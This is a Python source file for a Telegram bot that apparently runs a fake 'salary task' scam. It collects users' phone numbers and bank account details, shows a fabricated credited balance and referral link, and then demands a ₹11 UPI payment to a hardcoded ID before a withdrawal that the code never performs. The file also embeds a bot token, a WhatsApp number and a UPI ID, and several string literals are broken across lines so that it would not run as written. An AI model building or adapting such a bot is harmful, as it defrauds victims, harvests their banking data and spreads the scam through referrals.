import telebot
import random
from telebot import types

TOKEN = "7969758622:AAEoQS_FNCL4mWb-gfZ2fBhLqLP5yY1zaAs"
bot = telebot.TeleBot(TOKEN)

user_state = {}
otp_storage = {}
user_data = {}
salary_code = "HCPYRF"

@bot.message_handler(commands=['start'])
def start(m):
    cid = m.chat.id
    args = m.text.split()
    if len(args) > 1:
        referrer = int(args[1])
        if referrer != cid:
            user_data.setdefault(referrer, {}).setdefault('referrals', 0)
            user_data[referrer]['referrals'] += 1
    user_state[cid] = 'ASK_PHONE'
    bot.send_message(cid, "👋 Please enter your Telegram number:")

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    cid = m.chat.id
    if user_state.get(cid) == 'WAIT_SCREENSHOT':
        user_data[cid]['screenshot'] = True
        if user_data[cid].get('referrals', 0) >= 1:
            bot.send_message(cid, "✅ Withdrawal successful! Your request is being processed.")
        else:
            bot.send_message(cid, "❌ You need at least 1 referral to withdraw.")
        user_state[cid] = ''
    else:
        bot.send_message(cid, "❌ Unexpected image. Please follow instructions.")

@bot.message_handler(func=lambda m: True)
def handle(m):
    cid = m.chat.id
    text = m.text
    state = user_state.get(cid, '')

    if state == 'ASK_PHONE':
        otp = str(random.randint(1000, 9999))
        otp_storage[cid] = otp
        user_state[cid] = 'ASK_OTP'
        bot.send_message(cid, f"📩 Your OTP is: {otp}")
        return

    if state == 'ASK_OTP':
        if text == otp_storage.get(cid):
            user_state[cid] = 'ASK_BANK_BTN'
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("✅ Verify your bank account")
            bot.send_message(cid, "✅ OTP verified!", reply_markup=kb)
        else:
            bot.send_message(cid, "❌ Invalid OTP. Try again.")
        return

    if state == 'ASK_BANK_BTN' and text.startswith("✅"):
        user_state[cid] = 'ASK_BANK'
        bot.send_message(cid, "Enter bank details like:
A/C, IFSC, Bank Name")
        return

    if state == 'ASK_BANK':
        if ',' in text and len(text.split(',')) == 3:
            user_state[cid] = 'ASK_CODE'
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("📩 Claim your code", url="https://wa.me/918478026369?text=Hi,+I+have+completed+steps"))
            bot.send_message(cid, "✅ Bank saved. Click below:", reply_markup=markup)
        else:
            bot.send_message(cid, "❌ Invalid format. Use: A/C, IFSC, Bank")
        return

    if state == 'ASK_CODE':
        if text == salary_code:
            credited_amount = random.randint(855, 974)
            user_data.setdefault(cid, {})['balance'] = credited_amount
            user_data[cid]['referrals'] = user_data[cid].get('referrals', 0)
            bot.send_message(cid, f"🎉 ₹{credited_amount} successfully credited to your wallet!")
            bot.send_message(cid, f"🔗 Your referral link:
https://t.me/Task_Youtube_Bot?start={cid}")
            kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
            kb.add("💼 Withdraw")
            bot.send_message(cid, "👇 Tap below to withdraw your salary:", reply_markup=kb)
            user_state[cid] = ''
        else:
            bot.send_message(cid, "❌ Invalid code.")
        return

    if text == "💼 Withdraw":
        bot.send_message(cid, "💳 This is the final and last merchant task.
You need to pay ₹11 to UPI ID:
`9062435123@okbizaxis`
and send the screenshot.

📌 QR Code:", parse_mode='Markdown')
        bot.send_photo(cid, "https://i.ibb.co/VYHmccgW/qr.jpg")
        user_state[cid] = 'WAIT_SCREENSHOT'
        return

    bot.send_message(cid, "⚠️ Please follow the steps. Start with /start")

bot.polling(none_stop=True)
